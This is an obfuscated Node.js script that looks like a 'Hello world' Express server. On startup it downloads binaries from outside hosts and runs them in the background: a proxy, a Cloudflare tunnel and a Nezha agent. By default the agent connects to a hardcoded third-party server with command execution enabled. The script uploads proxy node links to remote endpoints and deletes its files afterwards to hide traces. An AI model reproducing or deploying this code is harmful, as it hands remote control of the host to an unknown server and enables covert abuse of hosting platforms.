const _0x1a19cf=_0x1f00;(function(_0x754be9,_0x3d19b3){const _0x6a09a3=_0x1f00,_0x5c675a=_0x754be9();while(!![]){try{const _0x2fc3c2=-parseInt(_0x6a09a3(0x127))/0x1+-parseInt(_0x6a09a3(0x126))/0x2+-parseInt(_0x6a09a3(0xba))/0x3*(parseInt(_0x6a09a3(0xa4))/0x4)+parseInt(_0x6a09a3(0xf5))/0x5*(-parseInt(_0x6a09a3(0xd3))/0x6)+parseInt(_0x6a09a3(0x13c))/0x7*(parseInt(_0x6a09a3(0xa7))/0x8)+-parseInt(_0x6a09a3(0xda))/0x9*(-parseInt(_0x6a09a3(0x143))/0xa)+-parseInt(_0x6a09a3(0x11d))/0xb;if(_0x2fc3c2===_0x3d19b3)break;else _0x5c675a['push'](_0x5c675a['shift']());}catch(_0x176a3e){_0x5c675a['push'](_0x5c675a['shift']());}}}(_0x4ddc,0xc51ad));const express=require(_0x1a19cf(0x11c)),app=express(),axios=require(_0x1a19cf(0x113)),os=require('os'),fs=require('fs'),path=require(_0x1a19cf(0x116)),{promisify}=require(_0x1a19cf(0x121)),exec=promisify(require(_0x1a19cf(0xaa))[_0x1a19cf(0xa2)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x1a19cf(0x139)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x1a19cf(0x139)][_0x1a19cf(0x123)]||'',AUTO_ACCESS=process['env'][_0x1a19cf(0x110)]||![],FILE_PATH=process[_0x1a19cf(0x139)]['FILE_PATH']||_0x1a19cf(0xbb),SUB_PATH=process[_0x1a19cf(0x139)]['SUB_PATH']||_0x1a19cf(0xd0),PORT=process[_0x1a19cf(0x139)][_0x1a19cf(0xeb)]||process[_0x1a19cf(0x139)][_0x1a19cf(0xbe)]||0x1eb4,UUID=process[_0x1a19cf(0x139)][_0x1a19cf(0xaf)]||'68ee0f7b-d470-48b1-b2c1-d07573e34cae',NEZHA_SERVER=process['env'][_0x1a19cf(0xcf)]||_0x1a19cf(0x12e),NEZHA_PORT=process['env'][_0x1a19cf(0xa3)]||'',NEZHA_KEY=process[_0x1a19cf(0x139)][_0x1a19cf(0x13a)]||_0x1a19cf(0x12f),ARGO_DOMAIN=process[_0x1a19cf(0x139)][_0x1a19cf(0x125)]||'',ARGO_AUTH=process[_0x1a19cf(0x139)][_0x1a19cf(0x122)]||'',ARGO_PORT=process['env'][_0x1a19cf(0xd8)]||0x1f41,CFIP=process[_0x1a19cf(0x139)][_0x1a19cf(0x10e)]||'www.visa.com.sg',CFPORT=process[_0x1a19cf(0x139)]['CFPORT']||0x1bb,NAME=process['env'][_0x1a19cf(0x149)]||_0x1a19cf(0xdf);!fs[_0x1a19cf(0x13b)](FILE_PATH)?(fs[_0x1a19cf(0xf8)](FILE_PATH,{'recursive':!![]}),console['log'](FILE_PATH+_0x1a19cf(0x107))):console[_0x1a19cf(0xfd)](FILE_PATH+_0x1a19cf(0x141));let npmPath=path[_0x1a19cf(0x112)](FILE_PATH,'npm'),phpPath=path[_0x1a19cf(0x112)](FILE_PATH,'php'),webPath=path['join'](FILE_PATH,'web'),botPath=path[_0x1a19cf(0x112)](FILE_PATH,'bot'),subPath=path[_0x1a19cf(0x112)](FILE_PATH,_0x1a19cf(0x118)),listPath=path[_0x1a19cf(0x112)](FILE_PATH,_0x1a19cf(0xd7)),bootLogPath=path[_0x1a19cf(0x112)](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,_0x1a19cf(0x11a));function deleteNodes(){const _0x11c1c7=_0x1a19cf;try{if(!UPLOAD_URL)return;if(!fs[_0x11c1c7(0x13b)](subPath))return;let _0x51904b;try{_0x51904b=fs[_0x11c1c7(0xa5)](subPath,_0x11c1c7(0x145));}catch{return null;}const _0x29ae66=Buffer[_0x11c1c7(0xe8)](_0x51904b,_0x11c1c7(0x10f))[_0x11c1c7(0xbd)](_0x11c1c7(0x145)),_0x3c9263=_0x29ae66[_0x11c1c7(0x10b)]('\x0a')[_0x11c1c7(0xf1)](_0x22c4a3=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x11c1c7(0xd5)](_0x22c4a3));if(_0x3c9263['length']===0x0)return;return axios[_0x11c1c7(0x132)](UPLOAD_URL+_0x11c1c7(0xce),JSON[_0x11c1c7(0xb8)]({'nodes':_0x3c9263}),{'headers':{'Content-Type':_0x11c1c7(0x13e)}})[_0x11c1c7(0x11f)](_0x152c38=>{return null;});}catch(_0x3340b5){return null;}}function cleanupOldFiles(){const _0x42c6c1=_0x1a19cf,_0x31c4bc=[_0x42c6c1(0x108),'bot',_0x42c6c1(0xd9),_0x42c6c1(0x136),_0x42c6c1(0x118),_0x42c6c1(0x12d)];_0x31c4bc['forEach'](_0x3aa922=>{const _0x24dd8d=_0x42c6c1,_0x41f457=path[_0x24dd8d(0x112)](FILE_PATH,_0x3aa922);fs[_0x24dd8d(0x105)](_0x41f457,()=>{});});}app[_0x1a19cf(0x12b)]('/',function(_0x267638,_0x5e1062){const _0xce402b=_0x1a19cf;_0x5e1062[_0xce402b(0x11b)](_0xce402b(0x147));});const config={'log':{'access':_0x1a19cf(0x100),'error':_0x1a19cf(0x100),'loglevel':_0x1a19cf(0x133)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1a19cf(0xdc),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x1a19cf(0x133),'fallbacks':[{'dest':0xbb9},{'path':_0x1a19cf(0xe6),'dest':0xbba},{'path':_0x1a19cf(0x10c),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x1a19cf(0xb5)}},{'port':0xbb9,'listen':_0x1a19cf(0x138),'protocol':_0x1a19cf(0xdc),'settings':{'clients':[{'id':UUID}],'decryption':_0x1a19cf(0x133)},'streamSettings':{'network':_0x1a19cf(0xb5),'security':_0x1a19cf(0x133)}},{'port':0xbba,'listen':_0x1a19cf(0x138),'protocol':_0x1a19cf(0xdc),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1a19cf(0x133)},'streamSettings':{'network':'ws','security':_0x1a19cf(0x133),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x1a19cf(0xb1)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1a19cf(0x138),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1a19cf(0xb6),_0x1a19cf(0xb9),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1a19cf(0x138),'protocol':_0x1a19cf(0xed),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1a19cf(0xb6),_0x1a19cf(0xb9),_0x1a19cf(0xb1)],'metadataOnly':![]}}],'dns':{'servers':[_0x1a19cf(0xca)]},'outbounds':[{'protocol':'freedom','tag':_0x1a19cf(0x119)},{'protocol':_0x1a19cf(0xfc),'tag':'block'}]};function _0x4ddc(){const _0x5e3902=['list.txt','ARGO_PORT','npm','12492RVuYpg','/api/add-nodes','vless','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','writeFileSync','Vls','unlinkSync','config.yaml','forEach','Content-Type','message','\x0a\x20\x20\x0atrojan://','/vless-argo','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','from','createWriteStream','match','SERVER_PORT','Subscription\x20uploaded\x20successfully','trojan','\x0a\x20\x20\x20\x20','?encryption=none&security=tls&sni=','\x20>/dev/null\x202>&1\x20&','filter','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','&path=%2Ftrojan-argo%3Fed%3D2560#','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','80QlHhFf','https://arm64.ssss.nyc.mn/web','/tunnel.yml\x20run','mkdirSync','pop','php\x20is\x20running','unshift','blackhole','log','trim','http\x20server\x20is\x20running\x20on\x20port:','/dev/null','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','listen','\x20-p\x20','Error\x20reading\x20boot.log:','unlink','App\x20is\x20running','\x20is\x20created','web','web\x20running\x20error:\x20','/npm\x20-s\x20','split','/vmess-argo','\x0a\x20\x20credentials-file:\x20','CFIP','base64','AUTO_ACCESS','then','join','axios','2053','2096','path','pipe','sub.txt','direct','config.json','send','express','2502159iDNBdM','error','catch','/bot\x20','util','ARGO_AUTH','PROJECT_URL','aarch64','ARGO_DOMAIN','1790428LswXCA','83190ftIiiO','2083','TunnelSecret','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','get','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','boot.log','nzku.fortymenty.eu.org:443','UsC5sNDciSaNggxJdB3EGSGYS242VT7q','web\x20is\x20running','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','post','none','/web\x20-c\x20','\x0aclient_secret:\x20','php','bot','127.0.0.1','env','NEZHA_KEY','existsSync','1897Ndelkf','npm\x20is\x20running','application/json','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','/api/add-subscriptions','\x20already\x20exists','nohup\x20','11500tCEbiC','Empowerment\x20failed\x20for\x20','utf-8','8443','Hello\x20world!','\x0a\x20\x20tunnel:\x20','NAME','\x0a\x20\x20\x0avmess://','npm\x20running\x20error:\x20','Empowerment\x20success\x20for\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','arm','bot\x20is\x20running.','https://arm64.ssss.nyc.mn/v1','map','all','tunnel.yml','length','exec','NEZHA_PORT','420ZjBEep','readFileSync','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','35128AUtZap','Error\x20executing\x20command:\x20','./bot','child_process','php\x20running\x20error:\x20','stream','status','clear','UUID','/sub.txt\x20saved\x20successfully','quic','443','true','2087','tcp','http','tunnel.json','stringify','tls','705vBGBCG','/tmp/vls','response','toString','PORT','添加URL失败:\x20','Download\x20','https://oooo.serv00.net/add-url','includes','/vmess-argo?ed=2560','?security=tls&sni=','data','\x20failed:\x20','https://amd64.ssss.nyc.mn/agent','push','NEZHA\x20variable\x20is\x20empty,skip\x20running','https+local://8.8.8.8/dns-query','https://arm64.ssss.nyc.mn/2go','has','automatic\x20access\x20task\x20added\x20successfully','/api/delete-nodes','NEZHA_SERVER','sub','fileUrl','https://amd64.ssss.nyc.mn/2go','280602IYgCqD','text/plain;\x20charset=utf-8','test','./web'];_0x4ddc=function(){return _0x5e3902;};return _0x4ddc();}fs[_0x1a19cf(0xde)](path[_0x1a19cf(0x112)](FILE_PATH,_0x1a19cf(0x11a)),JSON[_0x1a19cf(0xb8)](config,null,0x2));function getSystemArchitecture(){const _0x26613a=_0x1a19cf,_0x34928e=os['arch']();return _0x34928e===_0x26613a(0x14e)||_0x34928e==='arm64'||_0x34928e===_0x26613a(0x124)?_0x26613a(0x14e):'amd';}function downloadFile(_0x37bcaf,_0x329e3c,_0x3835a9){const _0x4e938e=_0x1a19cf,_0x2727a4=path['join'](FILE_PATH,_0x37bcaf),_0x262040=fs[_0x4e938e(0xe9)](_0x2727a4);axios({'method':_0x4e938e(0x12b),'url':_0x329e3c,'responseType':_0x4e938e(0xac)})[_0x4e938e(0x111)](_0x73adef=>{const _0xbe45b9=_0x4e938e;_0x73adef[_0xbe45b9(0xc5)][_0xbe45b9(0x117)](_0x262040),_0x262040['on']('finish',()=>{const _0x652313=_0xbe45b9;_0x262040['close'](),console[_0x652313(0xfd)](_0x652313(0xc0)+_0x37bcaf+'\x20successfully'),_0x3835a9(null,_0x37bcaf);}),_0x262040['on'](_0xbe45b9(0x11e),_0x5e1591=>{const _0xd153f3=_0xbe45b9;fs[_0xd153f3(0x105)](_0x2727a4,()=>{});const _0x5708c2=_0xd153f3(0xc0)+_0x37bcaf+_0xd153f3(0xc6)+_0x5e1591['message'];console[_0xd153f3(0x11e)](_0x5708c2),_0x3835a9(_0x5708c2);});})[_0x4e938e(0x11f)](_0x137032=>{const _0x5a28fd=_0x4e938e,_0x2a4db5=_0x5a28fd(0xc0)+_0x37bcaf+_0x5a28fd(0xc6)+_0x137032[_0x5a28fd(0xe4)];console[_0x5a28fd(0x11e)](_0x2a4db5),_0x3835a9(_0x2a4db5);});}async function downloadFilesAndRun(){const _0x4407ca=_0x1a19cf,_0x1ff2e7=getSystemArchitecture(),_0xc7c4=getFilesForArchitecture(_0x1ff2e7);if(_0xc7c4[_0x4407ca(0xa1)]===0x0){console[_0x4407ca(0xfd)](_0x4407ca(0x12c));return;}const _0x305329=_0xc7c4[_0x4407ca(0x151)](_0xf06d3c=>{return new Promise((_0x162b31,_0xe51d62)=>{const _0x1f10f1=_0x1f00;downloadFile(_0xf06d3c['fileName'],_0xf06d3c[_0x1f10f1(0xd1)],(_0xd45bf2,_0x5ee102)=>{_0xd45bf2?_0xe51d62(_0xd45bf2):_0x162b31(_0x5ee102);});});});try{await Promise[_0x4407ca(0x152)](_0x305329);}catch(_0x4dcf6d){console[_0x4407ca(0x11e)]('Error\x20downloading\x20files:',_0x4dcf6d);return;}function _0x9e239c(_0x2f635b){const _0x564ee6=_0x4407ca,_0xe2a0d1=0x1fd;_0x2f635b[_0x564ee6(0xe2)](_0x3dfd57=>{const _0x288f30=_0x564ee6,_0x44dddb=path[_0x288f30(0x112)](FILE_PATH,_0x3dfd57);fs[_0x288f30(0x13b)](_0x44dddb)&&fs['chmod'](_0x44dddb,_0xe2a0d1,_0x403ff8=>{const _0x97516c=_0x288f30;_0x403ff8?console[_0x97516c(0x11e)](_0x97516c(0x144)+_0x44dddb+':\x20'+_0x403ff8):console[_0x97516c(0xfd)](_0x97516c(0x14c)+_0x44dddb+':\x20'+_0xe2a0d1[_0x97516c(0xbd)](0x8));});});}const _0x4fd0c5=NEZHA_PORT?['./npm',_0x4407ca(0xd6),_0x4407ca(0xa9)]:['./php','./web','./bot'];_0x9e239c(_0x4fd0c5);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2659c2=NEZHA_SERVER[_0x4407ca(0xc2)](':')?NEZHA_SERVER[_0x4407ca(0x10b)](':')[_0x4407ca(0xf9)]():'',_0x4f82cc=new Set([_0x4407ca(0xb2),_0x4407ca(0x146),_0x4407ca(0x115),_0x4407ca(0xb4),_0x4407ca(0x128),'2053']),_0x592a6c=_0x4f82cc[_0x4407ca(0xcc)](_0x2659c2)?_0x4407ca(0xb3):'false',_0x29960c=_0x4407ca(0x135)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20'+_0x592a6c+_0x4407ca(0xe7)+UUID;fs[_0x4407ca(0xde)](path[_0x4407ca(0x112)](FILE_PATH,_0x4407ca(0xe1)),_0x29960c);const _0x11de2b=_0x4407ca(0x142)+FILE_PATH+'/php\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x11de2b),console[_0x4407ca(0xfd)](_0x4407ca(0xfa)),await new Promise(_0x1c21c7=>setTimeout(_0x1c21c7,0x3e8));}catch(_0x527f8e){console['error'](_0x4407ca(0xab)+_0x527f8e);}}else{let _0x20b0e8='';const _0x291dc3=[_0x4407ca(0xb2),'8443',_0x4407ca(0x115),_0x4407ca(0xb4),'2083',_0x4407ca(0x114)];_0x291dc3[_0x4407ca(0xc2)](NEZHA_PORT)&&(_0x20b0e8='--tls');const _0x3b8898=_0x4407ca(0x142)+FILE_PATH+_0x4407ca(0x10a)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4407ca(0x103)+NEZHA_KEY+'\x20'+_0x20b0e8+_0x4407ca(0xf0);try{await exec(_0x3b8898),console[_0x4407ca(0xfd)](_0x4407ca(0x13d)),await new Promise(_0x1d390d=>setTimeout(_0x1d390d,0x3e8));}catch(_0x2f8cb2){console[_0x4407ca(0x11e)](_0x4407ca(0x14b)+_0x2f8cb2);}}}else console[_0x4407ca(0xfd)](_0x4407ca(0xc9));const _0x20c0d2=_0x4407ca(0x142)+FILE_PATH+_0x4407ca(0x134)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x20c0d2),console[_0x4407ca(0xfd)](_0x4407ca(0x130)),await new Promise(_0x537aed=>setTimeout(_0x537aed,0x3e8));}catch(_0xd384f8){console[_0x4407ca(0x11e)](_0x4407ca(0x109)+_0xd384f8);}if(fs[_0x4407ca(0x13b)](path['join'](FILE_PATH,_0x4407ca(0x137)))){let _0x136ceb;if(ARGO_AUTH[_0x4407ca(0xea)](/^[A-Z0-9a-z=]{120,250}$/))_0x136ceb=_0x4407ca(0x12a)+ARGO_AUTH;else ARGO_AUTH[_0x4407ca(0xea)](/TunnelSecret/)?_0x136ceb=_0x4407ca(0xf4)+FILE_PATH+_0x4407ca(0xf7):_0x136ceb='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x4407ca(0xa6)+ARGO_PORT;try{await exec(_0x4407ca(0x142)+FILE_PATH+_0x4407ca(0x120)+_0x136ceb+'\x20>/dev/null\x202>&1\x20&'),console[_0x4407ca(0xfd)]('bot\x20is\x20running'),await new Promise(_0x12700d=>setTimeout(_0x12700d,0x7d0));}catch(_0x1272f){console[_0x4407ca(0x11e)](_0x4407ca(0xa8)+_0x1272f);}}await new Promise(_0x4cb24b=>setTimeout(_0x4cb24b,0x1388));}function getFilesForArchitecture(_0xd4f0c4){const _0x4f273=_0x1a19cf;let _0x4f0129;_0xd4f0c4===_0x4f273(0x14e)?_0x4f0129=[{'fileName':_0x4f273(0x108),'fileUrl':_0x4f273(0xf6)},{'fileName':'bot','fileUrl':_0x4f273(0xcb)}]:_0x4f0129=[{'fileName':_0x4f273(0x108),'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':'bot','fileUrl':_0x4f273(0xd2)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2c4fde=_0xd4f0c4==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x4f273(0xc7);_0x4f0129['unshift']({'fileName':_0x4f273(0xd9),'fileUrl':_0x2c4fde});}else{const _0x57e7be=_0xd4f0c4===_0x4f273(0x14e)?_0x4f273(0x150):'https://amd64.ssss.nyc.mn/v1';_0x4f0129[_0x4f273(0xfb)]({'fileName':_0x4f273(0x136),'fileUrl':_0x57e7be});}}return _0x4f0129;}function argoType(){const _0x924388=_0x1a19cf;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x924388(0xfd)](_0x924388(0x131));return;}if(ARGO_AUTH['includes'](_0x924388(0x129))){fs[_0x924388(0xde)](path[_0x924388(0x112)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x1cb78f=_0x924388(0x148)+ARGO_AUTH['split']('\x22')[0xb]+_0x924388(0x10d)+path['join'](FILE_PATH,_0x924388(0xb7))+_0x924388(0x14d)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x924388(0x101);fs[_0x924388(0xde)](path[_0x924388(0x112)](FILE_PATH,_0x924388(0xa0)),_0x1cb78f);}else console['log'](_0x924388(0x13f));}argoType();async function extractDomains(){const _0xa1ba37=_0x1a19cf;let _0x3b2104;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3b2104=ARGO_DOMAIN,console[_0xa1ba37(0xfd)]('ARGO_DOMAIN:',_0x3b2104),await _0x55c3c7(_0x3b2104);else try{const _0x2546c1=fs['readFileSync'](path[_0xa1ba37(0x112)](FILE_PATH,_0xa1ba37(0x12d)),_0xa1ba37(0x145)),_0x2411b2=_0x2546c1[_0xa1ba37(0x10b)]('\x0a'),_0x93723d=[];_0x2411b2[_0xa1ba37(0xe2)](_0x5e28f5=>{const _0x398b73=_0x5e28f5['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x398b73){const _0x11abab=_0x398b73[0x1];_0x93723d['push'](_0x11abab);}});if(_0x93723d[_0xa1ba37(0xa1)]>0x0)_0x3b2104=_0x93723d[0x0],console[_0xa1ba37(0xfd)]('ArgoDomain:',_0x3b2104),await _0x55c3c7(_0x3b2104);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0xa1ba37(0xe0)](path['join'](FILE_PATH,_0xa1ba37(0x12d)));async function _0x32820a(){try{await exec('pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1');}catch(_0x46c6e3){}}_0x32820a(),await new Promise(_0xb6c3a4=>setTimeout(_0xb6c3a4,0xbb8));const _0x3b45c2=_0xa1ba37(0xdd)+FILE_PATH+_0xa1ba37(0xa6)+ARGO_PORT;try{await exec(_0xa1ba37(0x142)+path[_0xa1ba37(0x112)](FILE_PATH,_0xa1ba37(0x137))+'\x20'+_0x3b45c2+_0xa1ba37(0xf0)),console[_0xa1ba37(0xfd)](_0xa1ba37(0x14f)),await new Promise(_0x384c30=>setTimeout(_0x384c30,0xbb8)),await extractDomains();}catch(_0xaa702b){console[_0xa1ba37(0x11e)](_0xa1ba37(0xa8)+_0xaa702b);}}}catch(_0x5732dd){console[_0xa1ba37(0x11e)](_0xa1ba37(0x104),_0x5732dd);}async function _0x55c3c7(_0x88f019){const _0x4b668c=_0xa1ba37,_0x13dc11=execSync('curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x4b668c(0x145)}),_0x16609d=_0x13dc11[_0x4b668c(0xfe)]();return new Promise(_0x44be0f=>{setTimeout(()=>{const _0x2722e2=_0x1f00,_0x2fea44={'v':'2','ps':NAME+'-'+_0x16609d,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x2722e2(0x133),'net':'ws','type':'none','host':_0x88f019,'path':_0x2722e2(0xc3),'tls':_0x2722e2(0xb9),'sni':_0x88f019,'alpn':''},_0x42bfdd='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x2722e2(0xef)+_0x88f019+'&type=ws&host='+_0x88f019+'&path=%2Fvless-argo%3Fed%3D2560#'+NAME+'-'+_0x16609d+_0x2722e2(0x14a)+Buffer[_0x2722e2(0xe8)](JSON[_0x2722e2(0xb8)](_0x2fea44))[_0x2722e2(0xbd)](_0x2722e2(0x10f))+_0x2722e2(0xe5)+UUID+'@'+CFIP+':'+CFPORT+_0x2722e2(0xc4)+_0x88f019+'&type=ws&host='+_0x88f019+_0x2722e2(0xf3)+NAME+'-'+_0x16609d+_0x2722e2(0xee);console[_0x2722e2(0xfd)](Buffer[_0x2722e2(0xe8)](_0x42bfdd)[_0x2722e2(0xbd)](_0x2722e2(0x10f))),fs[_0x2722e2(0xde)](subPath,Buffer['from'](_0x42bfdd)[_0x2722e2(0xbd)]('base64')),console[_0x2722e2(0xfd)](FILE_PATH+_0x2722e2(0xb0)),uplodNodes(),app[_0x2722e2(0x12b)]('/'+SUB_PATH,(_0x2e859e,_0x188220)=>{const _0x6b8338=_0x2722e2,_0x56bbe0=Buffer['from'](_0x42bfdd)[_0x6b8338(0xbd)]('base64');_0x188220['set'](_0x6b8338(0xe3),_0x6b8338(0xd4)),_0x188220[_0x6b8338(0x11b)](_0x56bbe0);}),_0x44be0f(_0x42bfdd);},0x7d0);});}}async function uplodNodes(){const _0x28be62=_0x1a19cf;if(UPLOAD_URL&&PROJECT_URL){const _0x5bf1b7=PROJECT_URL+'/'+SUB_PATH,_0x4422fd={'subscription':[_0x5bf1b7]};try{const _0x15fa9c=await axios[_0x28be62(0x132)](UPLOAD_URL+_0x28be62(0x140),_0x4422fd,{'headers':{'Content-Type':_0x28be62(0x13e)}});if(_0x15fa9c[_0x28be62(0xad)]===0xc8)console[_0x28be62(0xfd)](_0x28be62(0xec));else return null;}catch(_0x518192){if(_0x518192[_0x28be62(0xbc)]){if(_0x518192[_0x28be62(0xbc)][_0x28be62(0xad)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x4b2910=fs[_0x28be62(0xa5)](listPath,'utf-8'),_0x476b2f=_0x4b2910['split']('\x0a')[_0x28be62(0xf1)](_0x12d523=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x12d523));if(_0x476b2f['length']===0x0)return;const _0x31a8e8=JSON[_0x28be62(0xb8)]({'nodes':_0x476b2f});try{await axios[_0x28be62(0x132)](UPLOAD_URL+_0x28be62(0xdb),_0x31a8e8,{'headers':{'Content-Type':'application/json'}});if(response['status']===0xc8)console[_0x28be62(0xfd)]('Subscription\x20uploaded\x20successfully');else return null;}catch(_0x3ffafc){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4ba5d1=_0x1f00,_0x2850e7=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x2850e7[_0x4ba5d1(0xc8)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2850e7['push'](phpPath);exec('rm\x20-rf\x20'+_0x2850e7[_0x4ba5d1(0x112)]('\x20')+'\x20>/dev/null\x202>&1',_0x285825=>{const _0x51961e=_0x4ba5d1;console[_0x51961e(0xae)](),console[_0x51961e(0xfd)](_0x51961e(0x106)),console['log'](_0x51961e(0xf2));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4ccb3f=_0x1a19cf;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4ccb3f(0xfd)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x290ea4=await axios[_0x4ccb3f(0x132)](_0x4ccb3f(0xc1),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});console['log'](_0x4ccb3f(0xcd));}catch(_0x433e35){console[_0x4ccb3f(0x11e)](_0x4ccb3f(0xbf)+_0x433e35[_0x4ccb3f(0xe4)]);}}function _0x1f00(_0x59ff81,_0x305eed){const _0x4ddc3a=_0x4ddc();return _0x1f00=function(_0x1f00b4,_0x1b110c){_0x1f00b4=_0x1f00b4-0xa0;let _0xee809f=_0x4ddc3a[_0x1f00b4];return _0xee809f;},_0x1f00(_0x59ff81,_0x305eed);}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x1a19cf(0x102)](PORT,()=>console[_0x1a19cf(0xfd)](_0x1a19cf(0xff)+PORT+'!'));
